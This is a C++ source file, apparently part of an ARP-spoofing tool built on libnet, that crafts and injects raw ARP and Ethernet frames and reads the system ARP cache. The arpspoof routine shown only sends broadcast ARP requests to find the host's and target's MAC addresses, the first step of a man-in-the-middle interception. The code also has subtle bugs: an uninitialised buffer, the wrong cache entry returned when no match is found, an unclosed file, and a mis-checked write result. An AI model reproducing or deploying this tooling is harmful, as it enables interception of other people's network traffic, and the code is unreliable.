#include "arpspoof.hpp"


void killua::arp_packet( libnet_t *ltag, struct arp_ctx *ctx )
{
    libnet_ptag_t ether, arp;

    arp = libnet_autobuild_arp(
        ctx->opcode,
        ctx->src_hw,
        ctx->src_ip,
        ctx->dst_hw,
        ctx->dst_ip,
        ltag
    );
    if ( arp < 0 )
        killua::__die( ltag, "Arp header error!" );
    
    ether = libnet_autobuild_ethernet(
        ctx->dst_hw,
        ETHERTYPE_ARP,
        ltag
    );
    if ( ether < 0 )
        killua::__die( ltag, "Ethernet header error" );
}

struct arp_ctx * killua::format_arp( libnet_t *ltag, uint16_t opcode,
                                     uint8_t *src_hw,
                                     uint8_t *src_ip,
                                     uint8_t *dst_hw,
                                     uint8_t *dst_ip )
{
    static struct arp_ctx ctx;
    if ( opcode != ARPOP_REQUEST && opcode != ARPOP_REPLY )
        return NULL;
    
    ctx.opcode = opcode;
    memcpy( ctx.dst_hw, dst_hw, 6);
    memcpy( ctx.dst_ip, dst_ip, 4);
    memcpy( ctx.src_hw, src_hw, 6);
    memcpy( ctx.src_ip, src_ip, 4);
    return &ctx;
}

short killua::lookup_arp( char *ip, uint8_t *hw )
{
    FILE *fp;
    char line[0xFF];
    char addr[20];
    char hwtype[5];
    char flags[5];
    char hwaddr[25];
    char mask[5];
    char dev[25];

    if ( !(fp = fopen( ARP_CACHE, "r" )) ){
        return -1;
    }
    while ( fgets( line, 0xFF, fp ) ){
        sscanf( line, "%s %s %s %s %s %s", addr, hwtype, flags, hwaddr, mask, dev );
        if ( strcmp( addr, ip ) == 0 ) {
            break;
        }
    }
    fseek( fp, 0, SEEK_SET );
    if ( strlen( hwaddr ) > 0 && is_hw_format( hwaddr ) == 0 ) {
        cnvrt_hw2b( hwaddr, hw );
        return 0;
    }
    return -1;
}

int killua::inject_arp( libnet_t *ltag )
{
    int lpstat;
    if ( !(lpstat = libnet_write( ltag )) ){
        libnet_clear_packet( ltag );
        return -1;
    }
    return 0;
}

short killua::arpspoof( struct arpspf_ctx *conf, char *errbuf )
{
    libnet_t *ltag;
    struct libnet_ether_addr *hw;
    struct arp_ctx *ctx;
    uint8_t host_hw[6];
    uint8_t target_hw[6];
    uint8_t host_ip[4];
    uint8_t target_ip[4];
    uint8_t src_ip[4];

    if ( !(ltag = libnet_init(LIBNET_LINK, conf->iface, errbuf)) ) {
        return -1;
    }

    if ( !(hw = libnet_get_hwaddr( ltag )) ) {
        sprintf( errbuf, "%s\n", libnet_geterror( ltag ) );
        return -1;
    }
    
    if( dev_addr( conf->iface, src_ip, errbuf ) < 0 ){
        return -1;
    }

    cnvrt_ip2b( conf->host, host_ip );
    cnvrt_ip2b( conf->target, target_ip );

    // check if the host is in the arp cache
    if( killua::lookup_arp( conf->host, host_hw ) < 0 ){
        // set the arp data
        ctx = killua::format_arp(
            ltag,
            ARPOP_REQUEST,
            hw->ether_addr_octet,
            src_ip,
            (uint8_t *) "\xff\xff\xff\xff\xff\xff",
            host_ip
        );
        
        killua::arp_packet( ltag, ctx );
        if ( killua::inject_arp( ltag ) < 0 )
        {
            sprintf( errbuf, "Error injecting packet!\n" );
            return -1;
        }
    }

    // check if the target is in the arp cache
    if( killua::lookup_arp( conf->target, target_hw ) < 0 ){
        // set the arp data
        ctx = killua::format_arp(
            ltag,
            ARPOP_REQUEST,
            hw->ether_addr_octet,
            src_ip,
            (uint8_t *) "\xff\xff\xff\xff\xff\xff",
            target_ip
        );

        killua::arp_packet( ltag, ctx );
        if ( killua::inject_arp( ltag ) < 0 )
        {
            sprintf( errbuf, "Error injecting packet!\n" );
            return -1;
        }
    }
    return 0;
}

void killua::__die( libnet_t *ltag, const char *msg )
{
    std::cerr << msg << std::endl;
    if ( ltag )
        libnet_destroy( ltag );
    exit( 2 );
}